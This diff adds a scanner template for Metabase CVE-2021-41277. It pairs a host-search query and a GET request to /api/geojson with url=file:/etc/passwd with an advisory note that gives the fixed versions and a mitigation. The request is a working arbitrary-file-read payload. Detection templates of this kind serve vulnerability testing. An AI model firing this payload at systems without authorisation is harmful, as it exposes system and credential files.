@@ -1,0 +1,24 @@
+name: Metabase Geojson Arbitrary File Read CVE-2021-41277
+manual: true
+query: (app="Metabase" | title="Metabase" | body="Metabase")
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /api/geojson?url=file:/etc/passwd
+    expression: response.status == 200 && response.body.bcontains(b"/root:/bin/ash")
+expression: r0()
+detail:
+  author: aetkrad
+  links:
+  - https://mp.weixin.qq.com/s?__biz=Mzg3NDU2MTg0Ng==&mid=2247486238&idx=1&sn=0eea83880942b16975335739e1db5aa2
+  description: Metabase is an open source data analytics platform. In affected versions
+    a security issue has been discovered with the custom GeoJSON map (`admin-&gt;settings-&gt;maps-&gt;custom
+    maps-&gt;add a map`) support and potential local file inclusion (including environment
+    variables). URLs were not validated prior to being loaded. This issue is fixed
+    in a new maintenance release (0.40.5 and 1.40.5), and any subsequent release after
+    that. If you&#8217;re unable to upgrade immediately, you can mitigate this by
+    including rules in your reverse proxy or load balancer or WAF to provide a validation
+    filter before the application.
+  tags: fileread
